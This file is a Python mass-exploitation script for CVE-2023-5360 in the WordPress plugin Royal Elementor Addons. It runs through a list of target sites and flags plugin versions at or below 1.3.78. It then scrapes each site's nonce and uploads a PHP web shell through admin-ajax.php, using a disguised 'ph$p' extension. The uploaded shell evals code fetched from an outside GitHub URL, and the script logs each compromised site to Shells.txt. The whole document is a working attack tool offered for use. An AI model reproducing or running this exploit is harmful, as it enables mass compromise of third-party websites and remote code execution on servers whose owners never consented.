import requests
import os
import re
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, Style, init
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore', InsecureRequestWarning)
init(autoreset=True)

r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
}

def check_vuln(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
        response = requests.get(f'http://{url}/wp-content/plugins/royal-elementor-addons/readme.txt', headers=headers, timeout=10, verify=False)
        
        if response.status_code == 200:
            content = response.text
            version_line = next((line for line in content.split('\n') if line.startswith('Stable tag:')), None)
            if version_line:
                version = version_line.split(':')[1].strip()
                if version <= '1.3.78':
                    print(f"{y} > [Plugin VULN] {o} {url}")  # Print in yellow color
                    return True
            else:
                print(f"{y} > [Unable to retrieve version] {o} {url}")  # Print in yellow color
        else:
            print(f"{y} > [Non-200 response] {o} {url}")  # Print in yellow color
        
        return False
    except Exception as e:
        print(f"{r}Error: {e} {o}")  # Print in red color
        return False

def exploit(url):
    if url.endswith('/'):
        url = url[:-1]
    try:
        urle = 'https://' + url
        shell = """ <?php @eval("?>".file_get_contents("https://raw.githubusercontent.com/ajibarangxploit/shinx/main/shin.php"));?>"""
        filename = 'shin.ph$p'
        files = {'uploaded_file': (filename, shell)}
        hehe = requests.get(urle, timeout=10, verify=False).content
        regex_nonce = re.findall('WprConfig\\s*=\\s*{[^}]*"nonce"\\s*:\\s*"([^"]*)"', hehe)[0]
        data = {'action': 'wpr_addons_upload_file', 'max_file_size': '0', 'wpr_addons_nonce': regex_nonce, 'allowed_file_types': 'ph$p', 'triggering_event': 'click'}
        req = requests.post(urle + '/wp-admin/admin-ajax.php', data=data, files=files, timeout=10, verify=False).content
        if '{"success":true,"data":' in req:
            print(f'{g}Uploaded: {o}{urle}/wp-content/uploads/wpr-addons/forms/shin.php')
            # Menyimpan hasil di satu folder di atas dari tempat skrip ini dijalankan
            result_file = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'Shells.txt'))
            with open(result_file, 'a') as shell_file:
                shell_file.write(f"{urle}/wp-content/uploads/wpr-addons/forms/shin.php\n")
        else:
            print(f'{r}Failed: {o}{urle}')
    except Exception as e:
        print(f'{r}Error: {o}{e}')

if __name__ == '__main__':
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{r} WP-CVE-2023-5360  | {c}Chris Code\n")
    url_file = input('List:~# ')
    
    # Mendapatkan path file list dari satu folder di atas dari skrip ini
    script_dir = os.path.dirname(__file__)
    parent_dir = os.path.abspath(os.path.join(script_dir, '..'))
    list_file = os.path.join(parent_dir, url_file)
    
    with open(list_file, 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    pool = ThreadPool(20)  # Menggunakan ThreadPool dengan batas 20
    for url in urls:
        if check_vuln(url):
            exploit(url)
    
    pool.close()
    pool.join()